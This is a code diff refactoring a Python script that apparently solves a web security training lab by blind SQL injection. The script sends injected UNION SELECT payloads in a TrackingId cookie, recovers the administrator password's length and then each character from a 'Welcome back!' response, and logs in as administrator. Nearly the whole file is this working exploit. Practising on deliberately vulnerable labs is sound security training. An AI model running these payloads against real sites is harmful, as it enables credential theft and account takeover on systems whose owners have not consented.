@@ -1,14 +1,11 @@
 from ...utils import *
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
 import string
 
 
-def solve_lab(url, proxies):
+def solve_lab(session):
     print_info(
-        f'Determining the length of the administrator password by visiting "{url}" with the following cookies:'
+        f'Determining the length of the administrator password by visiting "/" with the following cookies:'
     )
     print(
         '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND LENGTH(password)=\033[1;93m?\033[00m --"}'
@@ -19,7 +16,7 @@ def solve_lab(url, proxies):
         cookies = {
             "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND LENGTH(password)={len_pass} --"
         }
-        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+        resp = session.get_path("/", cookies=cookies)
         soup = BeautifulSoup(resp.text, "html.parser")
         welcome_back = soup.find(string="Welcome back!")
 
@@ -31,7 +28,7 @@ def solve_lab(url, proxies):
             break
 
     print_info(
-        f'Determining administrator password by visting "{url}" with the following cookies:'
+        f'Determining administrator password by visting "/" with the following cookies:'
     )
     print(
         '{"TrackingId": "\' UNION SELECT password FROM users WHERE username=\'administrator\' AND SUBSTRING(password, \033[1;93m?\033[00m, 1)=\033[1;93m?\033[00m --"}'
@@ -44,7 +41,7 @@ def solve_lab(url, proxies):
             cookies = {
                 "TrackingId": f"' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password, {i+1}, 1)='{c}' --"
             }
-            resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+            resp = session.get_path("/", cookies=cookies)
             soup = BeautifulSoup(resp.text, "html.parser")
             welcome_back = soup.find(string="Welcome back!")
 
@@ -65,28 +62,4 @@ def solve_lab(url, proxies):
     print()
     print_success(f"Successfully extracted administrator password: {password}\n")
 
-    url = urljoin(url, "/login")
-    print_info(f'Grabbing CSRF value from "{url}"...')
-
-    s = requests.session()
-    resp = s.get(url, proxies=proxies, verify=False)
-    soup = BeautifulSoup(resp.text, "html.parser")
-    csrf = soup.select_one('input[name="csrf"]').get("value")
-
-    if csrf is None:
-        print_fail("Unable to grab CSRF value.")
-
-    else:
-        print_success(f"CSRF value: {csrf}\n")
-
-    data = {"csrf": csrf, "username": "administrator", "password": password}
-    print_info("Logging in with the following values:")
-    print(data)
-
-    resp = s.post(
-        url,
-        proxies=proxies,
-        verify=False,
-        data=data,
-    )
-    print_success("SQL injection attack performed.\n")
+    session.login("administrator", password)
